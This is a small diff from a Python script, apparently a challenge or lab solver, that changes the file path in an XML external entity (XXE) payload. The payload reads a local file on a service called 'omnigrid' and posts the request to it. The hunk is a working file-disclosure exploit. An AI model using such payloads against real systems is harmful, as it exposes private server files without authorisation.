@@ -86,7 +86,7 @@ def document_fragment(token: str) -> str:
     sealed until the Directory fragment is presented as `token`."""
     xml = (
         '<?xml version="1.0"?>'
-        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///opt/omnigrid/fragment.txt">]>'
+        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/omnigrid/fragment.txt">]>'
         "<request><document>&xxe;</document></request>"
     )
     resp = requests.post(
